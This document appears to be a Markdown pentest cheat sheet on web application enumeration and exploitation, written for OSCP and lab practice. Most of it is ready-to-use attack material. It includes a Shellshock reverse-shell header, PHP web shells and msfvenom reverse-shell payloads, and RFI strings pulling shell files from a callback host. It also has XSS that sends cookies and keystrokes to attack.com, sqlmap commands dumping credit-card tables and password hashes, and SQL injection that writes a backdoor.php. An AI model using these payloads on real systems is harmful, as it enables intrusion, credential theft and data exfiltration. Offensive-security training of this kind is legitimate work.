# Web Enum Quick Reference  
## Contents 
- [Web Enum Quick Reference](#web-enum-quick-reference)
  * [Contents](#contents)
  * [HTTP and HTTPS Checklist](#http-and-https-checklist)
  * [Scan for sub directories and pages](#scan-for-sub-directories-and-pages)
    + [Wordlists](#wordlists)
    + [Scanning Tools](#scanning-tools)
    + [Curl](#curl)
- [Web app specific](#web-app-specific)
- [Login pages](#login-pages)
- [Shellshock and Heartbleed](#shellshock-and-heartbleed)
  * [Heartbleed](#heartbleed)
  * [Shellshock](#shellshock)
- [File Inclusion](#file-inclusion)
  * [Local File Inclusion](#local-file-inclusion)
    + [File Upload Pages](#file-upload-pages)
    + [LFI Testing](#lfi-testing)
    + [Interesting Files](#interesting-files)
  * [Remote File Inclusion](#remote-file-inclusion)
  * [Web Payloads](#web-payloads)
    + [Testing](#testing)
- [Command Injection](#command-injection)
  * [Inject Input for Code Execution](#inject-input-for-code-execution)
  * [XSS](#xss)
  * [SQL Injection](#sql-injection)
    + [SQLMAP (Not allowed on OSCP exam but good for labs!)](#sqlmap--not-allowed-on-oscp-exam-but-good-for-labs--)
    + [Manual Testing](#manual-testing)
- [Resources](#resources)
  * [Cheat Sheets](#cheat-sheets)
  * [Further Reading](#further-reading)
  * [Sources](#sources)

## HTTP and HTTPS Checklist   
- [ ] Scan page with Wappanalyzer  
- [ ] Scan for sub directories and pages - admin pages?, login pages?, file upload?, user input fields?   
- [ ] Check for a robots.txt page    
- [ ] Test strength of encryption using nmap ssl-enum-ciphers script   
- [ ] Look for service name and version - searchsploit / google for exploits   
- [ ] Service specific scanners: wpscan, sqlmap     
- [ ] Admin page - access misconfigs, login?       
- [ ] Log in pages - guess default creds, admin:admin, admin:password   
- [ ] File upload pages - what types of files are accepted?, what checks are being implemented?  
- [ ] User input fields: SQL injection, cross site scripting   
- [ ] Intercept HTTP requests with Burp and examine    	

Reference: [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)    
[Wappanalyzer](https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/), [Foxy Proxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/) and [user agent switcher](https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/) Firefox extensions     
[Pen Testing Web Checklist](https://pentestbook.six2dez.com/others/web-checklist)    
## Scan for sub directories and pages	
### Wordlists 
Common wordlists to use for web directory scanning: 

    /usr/share/wordlists/dirb/common.txt
    /usr/share/wordlists/dirbuster/*.txt
    /usr/share/wordlists/wfuzz/general/*.txt
    /usr/share/seclists/Discovery/Web-Content/

Common wordlists to use for user enumeration scanning: 

    /usr/share/seclists/Usernames
    /usr/share/wordlists/dirbuster/apache-user-enum-2.0  
    
Create a wordlist with CeWL:   

    cewl http://www.site.org -w wordlist.txt    

CeWL sometimes misses directories so use these steps to create a dir list for CeWL to crawl:     

    feroxbuster -eknr --wordlist /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.10.10 -o ferox.txt   
    cat ferox.txt | grep 200 | grep -v "png\|\.js" | cut -d "h" -f2-100 | sed "s/^/h/g" >> urls.txt          
    for url in $(cat urls.txt); do echo $url && cewl -d 5 $url >> temp_cewl.txt;done           
    cat temp_cewl.txt | sort -u >> cewl.txt && rm temp_cewl.txt    
    tr '[:upper:]' '[:lower:]' < cewl.txt > cewl_lower.txt
    cat cewl_lower.txt >> cewl.txt
    #then use the CeWL wordlist for password guessing   
    
### Scanning Tools
Web Scanning:     

    nikto -h http://127.0.0.1:80/     
Page and Directory Fuzzing:    

    dirb http://127.0.0.1/   (default word list: common.txt)     
    gobuster dir -u http://127.0.0.1/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -z     
    ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -c -v  
    ffuf -w wordlist.txt -u http://www.site.org/FUZZ -e .aspx,.html,.php,.txt    
    feroxbuster -u http://target.com -w /usr/share/dirb/wordlists/common.txt -d [recursion depth] -t [threads] -s [status codes] 

    whatweb http://target  
    wfuzz -c --hc=404 -R 2 -w /usr/share/dirb/wordlists/common.txt http://target/fuzz   
    
 Virtual Hosts (subdomains):   
 
    gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://site.com --append-domain             
    
### Curl 

    curl -v -X OPTIONS http://<targetip>/test/  
    curl --upload-file <file name> -v --url <url> -0 --http1.0
    
Other Tools: 
    Burp Suite 
    OWASP Zap 
    Cadaver 
    SQLMap 
    Joomscan 
    Feroxbuster	 
    
	
# Web app specific  
See [CMS.md](https://github.com/lw8192/Red-Team-Rising/blob/main/Web/CMS.md)        

# Login pages   
	
	Default creds - admin: admin, admin:password, service specific default creds   
	Register a new user  
	Brute force log in  
	SQL injection  
# Shellshock and Heartbleed    
## Heartbleed   
Testing: scan using nmap heartbleed script   

    nmap -p 443 -sV --script ssl-heartbleed www.site.org    
Example: Exploit the Heartbleed vulnerability to steal the following from a vulnerable OpenSSL server's RAM: Username, Password, Cookie     
RAM is unpredictable, so you may need to run heartbleed.py multiple times. Must use Firefox / HTTPS to browse to site, perform 2 logins - first login will be in RAM.    
https://gist.github.com/eelsivart/10174134     
Save a local copy of the RAM contents that are disclosed via heartbleed. By default, heartbleed.py will write dump.bin to the current directory.    

    heartbleed.py -f /home/user/dump.bin heartbleed.site.org | less     
    strings /home/student/dump.bin    -> look for creds / cookie    

## Shellshock   
Metasploit module or 34900.py ("Apache mod_cgi - 'Shellshock' Remote Command Injection")   
Bug in Bash shell itself incorrectly executing trailing commands when it imports a function definition stored in an enviroment variable. Commonly found in CGI-based webservers, which use user input to define enviromental variables.     
Syntax: () { :; }   
Manual test for CGI based webservers: 
    
    curl -x http://192.168.90.61:3128 -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" -L http://10.10.10.10/cgi-bin/status
Nmap script check:   

    nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.10   
To exploit change vulnerable field in HTTP request (likely UAS) to a reverse shell command:        
    
    User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1    

 
# File Inclusion    
[PayloadAllTheThings FI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)  

## Local File Inclusion 
[Local File Inclusion](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/#gref)   
[Guide to LFI](http://www.securityidiots.com/Web-Pentest/LFI/guide-to-lfi.html)    
### File Upload Pages
Bypass extension filtering: rename file to an allowed extension (ie .php to .php.pdf file)        
Bypass header check:    

    %PDF-1.4
    <?php system($_GET["cmd"]); ?>

### LFI Testing    
Check for client side scripts     
Use a [LFI wordlist](https://github.com/Karmaz95/crimson/blob/master/words/exp/LFI) or [this](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt) to fuzz.     

    http://example.com/index.php?page=../../../etc/passwd  
    http://example.com/index.php?page=../../../etc/passwd%00                  #PHP below v. 5.3.4 bypass
    http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00        # double encoding    
    http://example.com/index.php?page=....//....//etc/passwd
    http://example.com/index.php?page=..///////..////..//////etc/passwd
    http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
	
    /etc/passwd, etc.
    can you include a remote file?
    ?test=php://filter/convert.base64-encode/resource=/filepath      -> base64 encode /decode  
	
    http://example.labs/page.php?file=php://filter/resource=/etc/passwd             #php filter wrapper 
	
	
Vulnerable PHP functions

    include
    require
    include_once 
    require_once 
	
### Interesting Files 
Linux 

    /etc/passwd
    /etc/shadow
    /etc/issue
    /etc/group
    /etc/hostname
    /etc/ssh/ssh_config
    /etc/ssh/sshd_config
    /root/.ssh/id_rsa
    /root/.ssh/authorized_keys
    /home/user/.ssh/authorized_keys
    /home/user/.ssh/id_rsa

Windows 

    /boot.ini
    /autoexec.bat
    /windows/system32/drivers/etc/hosts
    /windows/repair/SAM

Log Poisoning 

	open: /log/apache2/access.log 
	send payload as user agent string: <?php system($_GET['cmd']); ?>    
	/log/apache2/access.log&cmd=id  
	
## Remote File Inclusion 
Turning LFI to RFI: https://l.avala.mp/?p=241
[Reference](https://sushant747.gitbooks.io/total-oscp-guide/content/remote_file_inclusion.html)  

## Web Payloads 

PHP

    <?php echo shell_exec($_GET['cmd']);?> 
    <?php system($_GET['cmd']);?>
    <?php passthru($_GET['cmd']);?>
      
      
    msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
    cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

ASP

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp

JSP

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp

WAR

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war

### Testing 

    http://example.com/index.php?page=http://callback.com/shell.txt
    http://example.com/index.php?page=http://callback.com/shell.txt%00
    http://example.com/index.php?page=http:%252f%252fcallback.com%252fshell.txt
	
# Command Injection 
[Payloads](https://github.com/payloadbox)    
## Inject Input for Code Execution     

     text;echo test   #Unix only     
     echo test|     #Perl inject when open file     
     text | echo test
     text || echo test   #run 2nd cmd if error on initial      
     text & echo test   #initial cmd as bg task     
     text && echo test   #run 2nd cmd if no error on initial          
     $(echo test)   #bash specific      
     'echo test'    #Unix process substitute     
     >(echo test)    #Unix, process substitute     
    
Vulnerable PHP functions: system, exec, shell_exec, popen, proc_open, passthru, pcntl_exec    
## Stored XSS    
Stored XSS: Victim gets malicious code after view a webpage.    
Reflected XSS: code output is reflected in response to a user, common vuln in URL params (GET or POST). Usually needs social engineering as a delivery mechanism.     
Basic Payload

     <script>alert("XSS")</script>
Test Input Fields (html tag <hr>, form elements and GET params)        

     '';!--"<XSS>=&{ () }     #look for unmodified chars    
Check for HTTPOnly Cookie Flag (unable to effect cookie with JS)   

     wget --server-response https://site.com 2>&1 | grep -E "Content-Security-Policy|Set-Cookie"    
Steal Session Cookie

    <script>fetch('https://site.com/page?cookie=' + btoa(document.cookie));</script>   
    <script>document.location='http://attack.com/page.php?c='+document.cookie</script>        
Record Keys Entered     

     <script>document.onkeypress = function(e) { fetch('https://site.com/log?key=' + btoa(e.key) );}</script>          

## SQL Injection 
[SQL Injection Cheatsheet](https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md) 
[Pentestmonkey Cheatsheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)  
Enum using nmap

    nmap -sV --script=http-sql-injection <target>  
    
Using jsql 

### SQLMAP (Not allowed on OSCP exam but good for labs!) 
Crawl a page to find sql-injections. Always use a valid non-error generating URL and put the URL in quotes.   

    sqlmap -u "http://example.com" --crawl=1    
    sqlmap -u "http://site.org/index.php?vuln_param=1" --dbms=mysql --dbs    #after identifying a vulnerability see database names     
    sqlmap -u "http://site.org/index.php?vuln_param=1" --dbms=mysql -D database --tables    #get table names from a database       
    sqlmap -u "http://site.org/index.php?vuln_param=1" --dbms=mysql -D database -T table --dump    #dump table content         
Used captured HTTP request (use Burp proxy)   

    sqlmap -r sqli.txt   
Custom SQLi
    sqlmap -u --data="query" -D [database name] --tables --threads 5 
    
Dump database 

    sqlmap -u "http://172.21.0.0" --dbms=mysql --dump   
Get a shell 

    sqlmap -u "http://172.21.0.0" --dbms=mysql --os-shell
Using sqlmap with login-page  

    sqlmap -u "https://site.org/sqli/sqli.php?name=Bob" --file-read=/etc/passwd   #read file, if SQL is configured to allow that   
    sqlmap -r request.txt --dbs    
    sqlmap -r request.txt -D dbname -T tablename   
    sqlmap -r request.txt --search -D db_name_search   
    sqlmap -r request.txt -D nowasp -T credit_cards --dump --start=1 --start=2       #look at 1st 2 records in table    
    sqlmap -r request.txt --users --passwords           #find hashes / usernames     

### Manual Testing    
try single quote, then double quote, then try with comments     
Comment chars    

    ' " % %% -- /* // ) ;   
Testing Payloads    

    'or 1=1- -
    'or 1=1;-  
    ' or '1'=1
    ' or '1'=1 - -
    '–
    ' or '1'='1
    -'
    ' '
    '&'
    '^'
    '*'
    ' or ''-'
    ' or '' '
    ' or ''&'
    `' or ''^'``
    `' or ''*'
    "-"
    " "
    "&"
    "^"
    "*"
    " or ""-"
    " or "" "
    " or ""&"
    " or ""^"
    " or ""*"
    or true--
    " or true--
    ' or true--
    ") or true--
    ') or true--
    ' or 'x'='x
    ') or ('x')=('x
    ')) or (('x'))=(('x
    " or "x"="x
    ") or ("x")=("x
    ")) or (("x"))=(("x   
    
For a row 

    http://target-ip/inj.php?id=1 union all select 1,2,3,4,5,6,7,8      
Known Username

    admin’ - -
    admin’) - -
    
Using error-bases DB enumeration

    Add the tick '
    Enumerate columns  
    
Using order by
https://sushant747.gitbooks.io/total-oscp-guide/sql-injections.html

Figuring out schema   
MySQL:   
Databases: SELECT schema_name FROM information_schema.schemata   
Tables: SELECT table_name FROM information_schema.tables   
Columns: SELECT column_name FROM information_schema.columns   
#enum info
text UNION SELECT 1,@@version,user(),system_user(),database(),3,4,5,6,8,10,11
user() - username and hostname of account, system_user() - account name used by Windows auth     


MS SQL Server:   
Note: information_schema can be used for MS SQL Server as well, with some slight, but significant, differences. The queries will need to explicitly reference individual databases because information_schema is a view that provides only info on the current database. Databases: SELECT name FROM sys.databases   
Tables: SELECT name FROM sys.tables    
Columns: SELECT name FROM sys.columns    

Oracle:   
Schemas: SELECT owner FROM all_tables   
Tables: SELECT table_name FROM all_tables   
Columns: SELECT column_name FROM all_tab_columns   
	 
 SQL Injection Webshells
 
     #Linux
     ?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
     
     #Windows
     ?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
	
	
Example SQLi on Windows:
#testing

    http://10.10.10.10/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')

#exploitation

    http://10.10.10.10/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'

# SSRF   
Server requests resource of behalf of the web client.    
SSRF example using curl:    

    curl -v "https://site.org/get.php?logo=file://etc/hosts"    #local file reference   
	
# Resources  

## Cheat Sheets 
[SQLi cheat sheet](https://guif.re/sqli)  
[OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/Glossary.html)    
https://websec.ca/kb/sql_injection   
https://pentestmonkey.net/category/cheat-sheet/sql-injection   
https://sqlwiki.netspi.com/    
https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/    

## Further Reading 
[OWASP Web App Testing Guide](https://owasp.org/www-project-web-security-testing-guide/stable/)    
[Bypassing File Upload Restrictions ](http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html)      
[Web vulnerabilities to gain access to the system - paper](https://www.exploit-db.com/papers/13017/)     

File Inclusion
[RFI to LFI](https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1) 

Basic SQLi 
http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-SQLi.html     
http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-2-Basic-of-SQL-for-SQLi.html       
http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-3-Basic-of-SQL-for-SQLi.html      
http://www.sqlinjection.net/login/    

## Sources 
https://fareedfauzi.gitbook.io/ctf-checklist-for-beginner/web 
